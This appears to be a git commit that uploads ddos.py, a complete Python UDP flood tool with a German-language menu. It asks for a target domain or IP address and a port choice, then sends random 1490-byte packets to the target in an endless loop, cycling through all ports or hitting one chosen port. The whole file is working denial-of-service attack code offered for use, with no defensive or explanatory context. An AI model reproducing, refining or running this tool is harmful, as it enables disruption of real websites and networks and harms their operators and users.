3c31d0af5d10e4928d5d4e81549daa93bd63ef4b
ConsoleCrafter <hmm688907@gmail.com>
2025-08-15 18:32:40 +0200

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,107 @@
+# -*- coding: utf-8 -*-
+import os
+import time
+import random
+import socket
+from platform import system
+from tqdm.auto import tqdm
+
+# Plattform-Info
+uname = system()
+cmd_clear = 'cls' if uname == "Windows" else 'clear'
+os.system(cmd_clear)
+
+# Socket
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+# RDDoS_Tool
+while True:
+    # Benutzeroberfläche.
+    print("")
+    print("\033[92;1m")
+    print("1. Website-Domain\n2. IP-Adresse\n3. Beenden")
+    print('\033[0m')
+
+    # Eingabe.
+    opt = str(input("\n> "))
+
+    # Auswahl.
+    if opt == '1':
+        domain = str(input("Domain: "))
+        ip = socket.gethostbyname(domain)
+        break
+
+    elif opt == '2':
+        ip = str(input("IP-Adresse: "))
+        break
+
+    elif opt == '3':
+        exit()
+
+    else:
+        print('\033[91mUngültige Auswahl!\033[0m')
+        time.sleep(2)
+        os.system(cmd_clear)
+
+# Portauswahl.
+port_mode = False  # Wenn 'False', werden alle Ports verwendet, wenn 'True' - ein bestimmter Port.
+port = 2
+
+while 1:
+    port_bool = str(input("Bestimmter Port? [j/n]: "))
+
+    if port_bool.lower() == "j":
+        port_mode = True
+        port = int(input("Port: "))
+        break
+
+    elif port_bool.lower() == "n":
+        break
+
+    else:
+        print('\033[91mUngültige Auswahl!\033[0m')
+        time.sleep(2)
+
+# Arbeit starten.
+os.system(cmd_clear)
+print('\033[36;2mINITIALISIEREN....')
+time.sleep(1)
+print('START...')
+time.sleep(4)
+
+sent = 0
+
+if not port_mode:  # Alle Ports.
+    try:
+        while True:
+            if port == 65534:
+                port = 1
+
+            elif port == 1900:
+                port = 1901
+
+            sock.sendto(bytes, (ip, port))
+            sent += 1
+            port += 1
+            print("\033[32;1mGesendet %s Pakete an %s durch Port:%s" % (sent, ip, port))
+    except Exception:
+        print('\n\033[31;1mBeendet\033[0m')
+
+else:  # Bestimmter Port.
+    if port < 2:
+        port = 2
+
+    elif port == 65534:
+        port = 2
+
+    elif port == 1900:
+        port = 1901
+
+    try:
+        while True:
+            sock.sendto(bytes, (ip, port))
+            sent += 1
+            print("\033[32;1mGesendet %s Pakete an %s durch Port:%s" % (sent, ip, port))
+    except Exception:
+        print('\n\033[31;1mBeendet\033[0m')
